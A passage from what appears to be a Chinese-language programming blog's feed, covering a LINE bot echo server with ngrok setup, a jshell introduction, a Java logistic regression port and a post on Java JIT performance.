class="keyword">from</span> linebot.models <span class="keyword">import</span> (</span><br><span class="line">    MessageEvent, TextMessage, TextSendMessage,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get channel_secret and channel_access_token from your environment variable</span></span><br><span class="line">channel_secret = os.getenv(<span class="string">&#x27;LINE_CHANNEL_SECRET&#x27;</span>, <span class="string">&#x27;你的CHANNEL_SECRET&#x27;</span>)</span><br><span class="line">channel_access_token = os.getenv(<span class="string">&#x27;LINE_CHANNEL_ACCESS_TOKEN&#x27;</span>, <span class="string">&#x27;你的CHANNEL_ACCESS_TOKEN&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> channel_secret <span class="keyword">is</span> <span class="string">&#x27;你的CHANNEL_SECRET&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Specify LINE_CHANNEL_SECRET as environment variable.&#x27;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> channel_access_token <span class="keyword">is</span> <span class="string">&#x27;你的CHANNEL_ACCESS_TOKEN&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Specify LINE_CHANNEL_ACCESS_TOKEN as environment variable.&#x27;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">line_bot_api = LineBotApi(channel_access_token)</span><br><span class="line">parser = WebhookParser(channel_secret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/callback&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">callback</span>():</span><br><span class="line">    signature = request.headers[<span class="string">&#x27;X-Line-Signature&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get request body as text</span></span><br><span class="line">    body = request.get_data(as_text=<span class="literal">True</span>)</span><br><span class="line">    app.logger.info(<span class="string">&quot;Request body: &quot;</span> + body)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># parse webhook body</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        events = parser.parse(body, signature)</span><br><span class="line">    <span class="keyword">except</span> InvalidSignatureError:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># if event is MessageEvent and message is TextMessage, then echo text</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> events:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(event, MessageEvent):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(event.message, TextMessage):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        line_bot_api.reply_message(</span><br><span class="line">            event.reply_token,</span><br><span class="line">            TextSendMessage(text=event.message.text)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;OK&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    arg_parser = ArgumentParser(</span><br><span class="line">        usage=<span class="string">&#x27;Usage: python &#x27;</span> + __file__ + <span class="string">&#x27; [--port &lt;port&gt;] [--help]&#x27;</span></span><br><span class="line">    )</span><br><span class="line">    arg_parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">8000</span>, <span class="built_in">help</span>=<span class="string">&#x27;port&#x27;</span>)</span><br><span class="line">    arg_parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--debug&#x27;</span>, default=<span class="literal">False</span>, <span class="built_in">help</span>=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">    options = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line">    app.run(debug=options.debug, port=options.port)</span><br></pre></td></tr></table></figure><p>這邊在後面要重填一下在註冊好的 <a href="https://developers.line.biz/console">https://developers.line.biz/console</a> 當中 Basic settings 內的 Channel secret 以及 Messaging API settings 中的 Channel access token (long-lived) 項目。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">channel_secret = os.getenv(<span class="string">&#x27;LINE_CHANNEL_SECRET&#x27;</span>, <span class="string">&#x27;你的 Channel secret&#x27;</span>)</span><br><span class="line">channel_access_token = os.getenv(<span class="string">&#x27;LINE_CHANNEL_ACCESS_TOKEN&#x27;</span>, <span class="string">&#x27;你的 Channel access token&#x27;</span>)</span><br></pre></td></tr></table></figure><p>沒有改直接跑的話，程式碼會出現下面字樣來提醒。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Specify LINE_CHANNEL_SECRET as environment variable.</span><br><span class="line">or</span><br><span class="line">Specify LINE_CHANNEL_ACCESS_TOKEN as environment variable.</span><br></pre></td></tr></table></figure><p><strong>不需要下載其他 lib 這樣就可以跑了。</strong></p><h3 id="讓程式可以跟外網溝通"><a class="markdownIt-Anchor" href="#讓程式可以跟外網溝通"></a> 讓程式可以跟外網溝通</h3><p>但是我們會遇到下一個問題，跑完之後他會連到的位置是 <a href="http://localhost:8000">http://localhost:8000</a>，而 line 的伺服器無法從外網送資料進入內網給程式，也拿不到要傳給使用者的內容。</p><p>這個時候就需要到 <a href="https://dashboard.ngrok.com/get-started/setup">ngrok 下載處</a>把他下載下來，ngrok 可以方便的將內網轉換成外網的一個隨機網址。</p><p>然後下面的運行部分是在 linux 環境下的指令，所以 windows 會出現找不到指令的情形，這個時候就到下載好解壓縮完的 ngrok.exe 所在資料夾，記下路徑然後在虛擬環境內新開一個 terminal (終端)，將路徑導向程式所在資料夾。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd C:\path to file</span><br></pre></td></tr></table></figure><p>接下來輸入下面的指令。</p><h4 id="windows"><a class="markdownIt-Anchor" href="#windows"></a> windows</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ngrok.exe http <span class="number">8000</span></span><br></pre></td></tr></table></figure><h4 id="linux"><a class="markdownIt-Anchor" href="#linux"></a> linux</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">./ngrok http <span class="number">80</span></span><br></pre></td></tr></table></figure><p>就可以看到類似以下的介面。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ngrok by @inconshreveable                                                                                                                                                                                              (Ctrl+C to quit)</span><br><span class="line"></span><br><span class="line">Session Status                online</span><br><span class="line">Session Expires               <span class="number">1</span> hour, <span class="number">8</span> minutes</span><br><span class="line">Version                       <span class="number">2.3</span><span class="number">.40</span></span><br><span class="line">Region                        United States (us)</span><br><span class="line">Web Interface                 http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">4041</span></span><br><span class="line">Forwarding                    http://<span class="number">3327</span>-<span class="number">218</span>-<span class="number">166</span>-<span class="number">17</span>-<span class="number">89.</span>ngrok.io -&gt; http://localhost:<span class="number">8000</span></span><br><span class="line">Forwarding                    https://<span class="number">3327</span>-<span class="number">218</span>-<span class="number">166</span>-<span class="number">17</span>-<span class="number">89.</span>ngrok.io -&gt; http://localhost:<span class="number">8000</span></span><br><span class="line"></span><br><span class="line">Connections                   ttl     opn     rt1     rt5     p50     p90     </span><br><span class="line">                              <span class="number">13</span>      <span class="number">0</span>       <span class="number">0.00</span>    <span class="number">0.00</span>    <span class="number">0.32</span>    <span class="number">0.94</span>    </span><br><span class="line"></span><br><span class="line">HTTP Requests</span><br></pre></td></tr></table></figure><p><a href="https://3327-218-166-17-89.ngrok.io">https://3327-218-166-17-89.ngrok.io</a> 就是 ngrok 幫我建立在外網的一個隨機網址，接下來將此網址複製，並在後面加上 /callback (仔細看程式，程式會在這個網址回應)貼到 <a href="https://developers.line.biz/console">https://developers.line.biz/console</a> 中 Messaging API settings 內的 Webhook URL，貼完按下 verify 基本上就可以驗證成功了。</p><p>想要開啟 ngrok 提供的 Dashboard 的話請按下 Ctrl + 點選 Web Interface後面的網址，例如 <a href="http://127.0.0.1:4041">http://127.0.0.1:4041</a> 。</p><p>如果需要多個 callback URL 的話，原先官方給的資料是換行填寫，但是我實測他換行功能好像鎖起來了，或許可以發一下 issue 詢問。</p><p>接下來用自己的手機將創建出來的機器人加為好友之後就可以開始玩了。</p><h3 id="該從哪裡開始下手去對於程式碼做出改變"><a class="markdownIt-Anchor" href="#該從哪裡開始下手去對於程式碼做出改變"></a> 該從哪裡開始下手去對於程式碼做出改變</h3><p>找到callback()裡面的這個然後就可以先試著做更改了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> event <span class="keyword">in</span> events:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(event, MessageEvent):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(event.message, TextMessage):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    line_bot_api.reply_message(</span><br><span class="line">        event.reply_token,</span><br><span class="line">        TextSendMessage(text=event.message.text)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>在加入好友之後，可以對機器人進行對話。</p><p>例如對它說一個 hi。</p><p>接下來我幫大家捕捉了程式碼當中的 event 查看內部到底有什麼呢 ?</p><p>event 的格式如下:</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;14651735376424&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hi&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;mode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;active&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;replyToken&quot;</span><span class="punctuation">:</span> <span class="string">&quot;48d30e0ca8594d5fb1f9d956f561597e&quot;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;source&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;user&quot;</span><span class="punctuation">,</span> </span><br><span class="line">        <span class="attr">&quot;userId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ud3903825f232e3d357c074ece1efd5dd&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;timestamp&quot;</span><span class="punctuation">:</span> <span class="number">1630174218140</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;message&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>可以從上很明顯的看出，使用者說了一個 hi，如果呼叫此函式。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">line_bot_api.reply_message(</span><br><span class="line">    event.reply_token,</span><br><span class="line">    TextSendMessage(text=event.message.text)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>機器人就會回應使用者一個 hi。</p><p>所以可以直接拿這個框架，配合簡單的字串處理找出關鍵字，回復使用者一些訊息。</p><p>基本上做到這裡就差不多完成了，但是 line bot 回復的時候還會多加上一段話。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">感謝您的訊息！</span><br><span class="line"></span><br><span class="line">很抱歉，本帳號無法個別回覆用戶的訊息。</span><br><span class="line">敬請期待我們下次發送的內容喔(content)</span><br></pre></td></tr></table></figure><p>這是因為在 Messaging API settings 中的 Auto-reply messages 有預設自動回復，點擊 edit 選項之後，將在進階設定內的自動回應訊息設定關閉就好了。</p><p>好累喔，不知不覺六千多字，圖片等資料傳送和處裡以及 line 的一些有趣功能下次再寫，寫部落格比直接實作難多了。</p>]]></content>
      
      
      <categories>
          
          <category> line bot </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在部落格上面跑python和R</title>
      <link href="/try-to-use-python-or-R-in-my-blog/"/>
      <url>/try-to-use-python-or-R-in-my-blog/</url>
      
        <content type="html"><![CDATA[<p>其實也不算專案，就只是我弄得小嘗試而已。</p><script type="text/javascript" src="//cdn.datacamp.com/dcl-react.js.gz"></script><p>可以在這裡跑python</p><div data-datacamp-exercise data-lang="python">    <code data-type="sample-code">a = 5 <br>        print(a)</code></div><p>可以在這裡跑R</p><div data-datacamp-exercise data-lang="r">    <code data-type="sample-code">a <- 5 <br>        print(a)</code></div><p>編譯過程沒有在本地快速，需要幾秒啟動時間，但還算方便(?)</p>]]></content>
      
      
      <categories>
          
          <category> 專案 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>jshell</title>
      <link href="/jshell/"/>
      <url>/jshell/</url>
      
        <content type="html"><![CDATA[<p>因為真的很好玩就開一篇來介紹 jshell 這個東西。</p><p>它位於&quot;\bin&quot;路徑之下，例如&quot;C:\Program Files\Java\jdk-16.0.1\bin&quot;資料夾當中，可以找到jshell.exe。</p><h2 id="jshell能夠做到什麼"><a class="markdownIt-Anchor" href="#jshell能夠做到什麼"></a> jshell能夠做到什麼?</h2><p>這是一個 REPL(Read-Eval-Print Loop) 的交互式實時命令工具。</p><img src="/jshell/1.png" class=""><p>大概像是這樣，其實滿酷的。</p><span id="more"></span><p>官方文檔說 jshell 的功能是這樣。</p><p><strong>JShell helps you try out code and easily explore options as you develop your program. You can test individual statements, try out different variations of a method, and experiment with unfamiliar APIs within the JShell session. JShell doesn’t replace an IDE. As you develop your program, paste code into JShell to try it out, and then paste working code from JShell into your program editor or IDE.</strong></p><p>基本上就是可以把 code 在 JShell 中進行測試，測完再放入自己的程式當中。</p><p>另外可以透過 /help 來查詢指令。</p><img src="/jshell/2.png" class=""><h2 id="總結"><a class="markdownIt-Anchor" href="#總結"></a> 總結</h2><p>好啦，感覺我也不會用到這個功能，但是挖文檔挖到覺得很好玩，所以分享一下。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>java邏輯回歸程式實作範例</title>
      <link href="/random-logistic-regression-code/"/>
      <url>/random-logistic-regression-code/</url>
      
        <content type="html"><![CDATA[<p>改寫自此python code，因為網路上流傳太多版本<s>大陸互相亂爬導致到處都有</s>，找不到出處故只附此code，若侵犯版權請盡速與我聯繫。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 這個是別人的啦!不是我寫的。</span></span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># Sigmoid函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sigmoid</span>(<span class="params">inX</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1.0</span> / (<span class="number">1</span> + np.exp(-inX))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 梯度上升</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gradAscent</span>(<span class="params">dataMatIn, classLabels</span>):</span><br><span class="line">    dataMatrix = np.mat(dataMatIn)</span><br><span class="line">    labelMat = np.mat(classLabels).transpose()</span><br><span class="line">    m, n = dataMatrix.shape</span><br><span class="line">    alpha = <span class="number">0.01</span></span><br><span class="line">    maxCycles = <span class="number">500</span></span><br><span class="line">    weights = np.ones((n, <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(maxCycles):</span><br><span class="line">        h = sigmoid(dataMatrix * weights)</span><br><span class="line">        error = (labelMat - h)</span><br><span class="line">        weights = weights + alpha * dataMatrix.transpose() * error</span><br><span class="line">    <span class="keyword">return</span> weights</span><br></pre></td></tr></table></figure><p>下面是改寫後的 java code，按照註解來，使用上只要動到訓練和預測的部分就可以了。</p><p>效能比不上有照論文實作優化過的，但我覺得是很好的學習範例，畢竟邏輯回歸可以當分類和回歸用，可以都玩玩看啦，希望大家玩得開心也得到一些收穫。</p><span id="more"></span><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> afan;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: Afan Chen</span></span><br><span class="line"><span class="comment"> * 機器學習算法:邏輯回歸</span></span><br><span class="line"><span class="comment"> * 損失函數:交叉熵</span></span><br><span class="line"><span class="comment"> * 激勵函數:sigmoid</span></span><br><span class="line"><span class="comment"> * 疊代算法:隨機梯度上升算法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LogisticRegression</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * sigmoid函數</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> num 權重與特徵的內積</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 事件發生機率</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">sigmoid</span><span class="params">(<span class="type">double</span> num)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1.0</span> / (<span class="number">1</span> + Math.exp(-num));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 將訓練結果回傳</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> datas 資料</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inx 第幾筆資料</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> weights 權重</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 權重與特徵的內積</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">sumMatrixRowMutiWeight</span><span class="params">(<span class="type">double</span>[][] datas, <span class="type">int</span> inx, <span class="type">double</span>[] weights)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; datas.length; i++) &#123;</span><br><span class="line">            res += datas[inx][i] * weights[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 將該筆數據跑過一次得到新的權重後回傳</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span>[] adjustWeights(<span class="type">double</span>[][] datas, <span class="type">int</span> inx, <span class="type">double</span>[] weights, <span class="type">double</span> alpha , <span class="type">double</span> error) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span>[] res = <span class="keyword">new</span> <span class="title class_">double</span>[weights.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; weights.length; i++) &#123;</span><br><span class="line">            res[i] = alpha * error * datas[inx][i] + weights[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 訓練模型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> datas 資料</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> labels 標籤</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span>[] stocGradAscentl(<span class="type">double</span>[][] datas, <span class="type">double</span>[] labels) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">double</span>[] res = <span class="keyword">new</span> <span class="title class_">double</span>[datas[<span class="number">0</span>].length];</span><br><span class="line"></span><br><span class="line">        Arrays.fill(res, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; datas.length; j++) &#123;</span><br><span class="line">                <span class="type">double</span> <span class="variable">alpha</span> <span class="operator">=</span> <span class="number">4</span> / (<span class="number">1.0</span> + j + i) + <span class="number">0.01</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">randIndex</span> <span class="operator">=</span> r.nextInt(datas.length);</span><br><span class="line">                <span class="type">double</span> <span class="variable">h</span> <span class="operator">=</span> sigmoid(sumMatrixRowMutiWeight(datas, randIndex, res));</span><br><span class="line">                <span class="type">double</span> error=labels[randIndex]-h;</span><br><span class="line">                res = adjustWeights(datas, randIndex, res, alpha,error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 訓練模型</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> datas 資料</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> labels 標籤</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> maxIter 疊代次數，沒設終止條件等他跑完</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 特徵權重</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span>[] stocGradAscentl(<span class="type">double</span>[][] datas, <span class="type">double</span>[] labels, <span class="type">int</span> maxIter) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">        <span class="type">double</span>[] res = <span class="keyword">new</span> <span class="title class_">double</span>[datas[<span class="number">0</span>].length];</span><br><span class="line"></span><br><span class="line">        Arrays.fill(res, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; maxIter; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; datas.length; j++) &#123;</span><br><span class="line">                <span class="type">double</span> <span class="variable">alpha</span> <span class="operator">=</span> <span class="number">4</span> / (<span class="number">1.0</span> + j + i) + <span class="number">0.01</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">randIndex</span> <span class="operator">=</span> r.nextInt(datas.length);</span><br><span class="line">                <span class="type">double</span> <span class="variable">h</span> <span class="operator">=</span> sigmoid(sumMatrixRowMutiWeight(datas, randIndex, res));</span><br><span class="line">                <span class="type">double</span> error=labels[randIndex]-h;</span><br><span class="line">                res = adjustWeights(datas, randIndex, res, alpha,error);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 預測發生機率</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> feature 特徵值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> weights 權重</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 回傳機率</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">predictionProbability</span><span class="params">(<span class="type">double</span>[] feature, <span class="type">double</span>[] weights)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">prob</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; feature.length; i++) &#123;</span><br><span class="line">            prob += feature[i] * weights[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        prob = sigmoid(prob);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prob;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 預測結果(哪種可能比較大</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> feature 特徵值</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> weights 權重</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 回傳預測</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">prediction</span><span class="params">(<span class="type">double</span>[] feature, <span class="type">double</span>[] weights)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">double</span> <span class="variable">prob</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; feature.length; i++) &#123;</span><br><span class="line">            prob += feature[i] * weights[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        prob = sigmoid(prob);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> prob&gt;=<span class="number">0.5</span>?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 機器學習 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JIT(Just In Time)，Java的即時編譯特性</title>
      <link href="/jit/"/>
      <url>/jit/</url>
      
        <content type="html"><![CDATA[<p>這篇文的動機是因為最近一直聽到別人勸告新手與其學 java 不如學 c ，原因是<strong>java速度很慢</strong>，這個理由我不太能接受，所以就寫一篇文章來說明為什麼 java 的速度其實跟 c、c++ 差不多，在特定情況下藉由 JIT 技術已經比 C 或 C++ 快了。</p><p>首先，我們要知道 java 的編譯過程。</p><p>java 和 c 的 compiler 滿不一樣的，java 不同於 c 直接 compile 成 CPU 的指令，他是產生**統一規格的 bytecode，在運行期間，JVM 才會 interpret bytecode，所以只需要 build 一份 bytecode 就可以在各平台上運行。</p><p>這樣的編譯流程帶來跨平台的好處之外，還有運行效能的缺點，所以在2000年左右，java開始研究 <a href="https://www.oracle.com/java/technologies/javase/javase-core-technologies-apis.html">HotSpot</a> 的核心技術。</p><p>這裡要先講一個滿常發生的程式特性，<strong>大部分的運行時間被運用在少數的程式碼上</strong>。</p><span id="more"></span><h3 id="jit的在編譯階段的優化"><a class="markdownIt-Anchor" href="#jit的在編譯階段的優化"></a> JIT的在編譯階段的優化</h3><p>hot spot 的意思是 bytecode 當中常被使用到的程式碼片段，JVM 在運行程式的時候，先分析和找出這些程式碼片段，接下來將這些程式碼片段做大範圍的最佳化、以及將程式碼 compile 成特定處理器的指令。</p><p>簡單來說，就是編譯器自動幫你重構被重複使用的程式碼來加速程式的效能。(題外話，Oracle 推薦大家用他的 JDK 的理由就是他自稱有很多的黑科技優化，但很遺憾我還是選擇 openJDK。)</p><p><img src="https://miro.medium.com/max/1094/1*N4ns2d0oFaoN3EalxVd-CQ.png" alt="" /></p><p>這是一張 C 和 java 的效能比較圖，比較項目是大矩陣的運算耗時，詳情請看<a href="https://medium.com/swlh/a-performance-comparison-between-c-java-and-python-df3890545f6d">文章</a>。</p><p>C 語言在使用 GCC 編譯時，若未經過 <a href="https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html">-O2 and -O3 optimization</a>，速度其實不會比 java 快，當然這是因為GCC把這些黑科技優化鎖起來了的關係，java 的優勢我覺得還是在開發上面的便利和生態系，所謂的 java 比 c 或 c++ 快的論點我覺得都是在特定情況下的吹捧。</p><p>但是還是希望大家能夠有一個概念，<strong>現代的 java 速度跟 c 的差異其實沒有大家想像的大</strong>。</p><p><img 